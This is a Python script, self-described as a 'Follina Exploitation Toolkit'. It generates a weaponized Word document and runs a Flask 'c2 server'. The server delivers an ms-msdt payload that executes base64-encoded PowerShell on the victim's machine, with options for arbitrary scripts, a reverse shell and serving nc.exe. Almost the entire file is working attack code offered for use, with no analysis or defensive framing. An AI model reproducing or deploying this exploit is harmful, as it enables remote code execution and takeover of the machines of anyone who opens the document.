
import os 
import shutil
import socket
import base64
from flask import Flask, send_file
import threading
import tempfile
import argparse

TEMPLATE_PATH = './template'
URL_PATH = 'word/_rels/document.xml.rels'

def _build_html_payload(cmd,is_shell= False):
	if is_shell:
		command = cmd
	elif cmd.endswith("ps1"):
		try:
			with open(cmd,'r') as f:
				command = f.read()
		except:
			print("[!] Failed to open: {cmd}")
			exit(1)
	else:
		command = fr'Start-Process {cmd};'	
	encoded_command = base64.b64encode(command.encode()).decode()

	payload = r'''"ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c'''
	payload+= r''' IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed '''
	payload+= r'''IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'''
	payload+= r''''+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'''
	payload += fr''''{encoded_command}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";'''
	padding = f"//{'A'*128}\n"*32 #4KB padding

	template = '''<!DOCTYPE html>'''
	template += '''<html>'''
	template += '''    <body>'''
	template += '''		<script>'''
	template += f'''	{padding}'''
	template += f'''		window.location.href={payload}'''
	template += '''		</script>'''
	template += '''    </body>'''
	template += '''</html>'''
	
	return template
def _get_local_ip_addr():
	'''return the hosts local ip address'''
	with socket.socket(socket.AF_INET,socket.SOCK_DGRAM) as s:
		s.connect(('8.8.8.8',80))
		ip_addr = s.getsockname()[0]
	return ip_addr

def make_a_temp_copy(temp_path):
	#copy template into the temp directory
	shutil.copytree(TEMPLATE_PATH,temp_path,dirs_exist_ok=True)

def update_template_url(url,path):
	ifile = os.path.join(path,URL_PATH)
	with open(ifile,'r+') as f:
		content = f.read().format(serverUrl='%s!' % url)
		f.seek(0)
		f.write(content)

def create_document(ofile,files_path):
	#remove .DS_Store to prevent issues on mac
	try:
		os.rmdir(os.path.join(files_path,'.DS_Store'))
	except:
		pass
	#make an archive
	shutil.make_archive(ofile,'zip',files_path)
	#change the file extension from zip to docx
	os.rename(f'{ofile}.zip',f'{ofile}.docx')



# ------------------------- Arguments ------------------------------------

parser = argparse.ArgumentParser(description='Follina Exploitation Toolkit')

parser.add_argument('-u','--host',metavar='HOST_IP',type=str,default=_get_local_ip_addr(),
					help='host ip address')

parser.add_argument('-p','--port',metavar='PORT',type=int,default=5000, help='host port')

parser.add_argument('-o','--output',metavar='OFILE',type=str,default='./follina',
					help='output file')

parser.add_argument('-m','--mode',metavar='{server, create}',type=str,default='server,create',
				help='operation mode - create doc file, run a server or both')

parser.add_argument('-s','--script',metavar ='{script | script_file.ps1}',type=str,default='calc.exe',
			help='PS script for execution.')

parser.add_argument('-r','--remote', metavar ='HOST_IP:PORT',type=str,help='get a remote shell')
# ------------------------------------------------------------------------

# --------------------- Webserver Code -----------------------------------

app = Flask('c2 server')

@app.route('/index.html') 
def send_payload():
	args = parser.parse_args() 
	if args.remote:
		try:
			ip,port = args.remote.split(':')
			with open('./scripts/remote_shell.ps1','r') as f:
				script = f.read().format(HOST=args.host,PORT=args.port,HOST_IP_REV=ip,PORT_REV=port)
		except:	
			print('[!] failed to open: remote_shell.ps1')
			exit(1)

	else:
		script = args.script
	print(script)
	html_template = _build_html_payload(script,args.remote)

	return html_template

@app.route('/download.html')
def upload_doc():
	args = parser.parse_args()
	if 'create' in args.mode.lower():
		return send_file(f'{args.output}.docx')
	print("[!] download is only possible in create mode")
	return '',404

@app.route('/nc.html')
def send_nc():
	return send_file('./scripts/nc.exe')

# ------------------------------------------------------------------------

if __name__ == '__main__':
	args = parser.parse_args()
	
	if 'server' in args.mode.lower().split(','):
		#run a webserver in a separate thread
		webserver_thread = threading.Thread(target=app.run,kwargs={'host':'0.0.0.0','port':args.port})
		webserver_thread.start()
		if 'create' in args.mode.lower().split(','):
			print(f"[+] serving the file: {args.output.split('/')[-1]}.docx at http://{args.host}:{args.port}/download.html")
	if 'create' in args.mode.lower().split(','):
		#create a temporary directory for the document files
		tmp_dir = tempfile.TemporaryDirectory()
		make_a_temp_copy(tmp_dir.name)
		print(f'[+] injecting the template.\n    - host: {args.host}\n    - port:{args.port}')
		update_template_url(f'http://{args.host}:{args.port}/index.html',tmp_dir.name)
		ofile = args.output #TODO remove extension
		create_document(ofile,tmp_dir.name)
		print(f'[+] created: {ofile}.docx')
		tmp_dir.cleanup()	

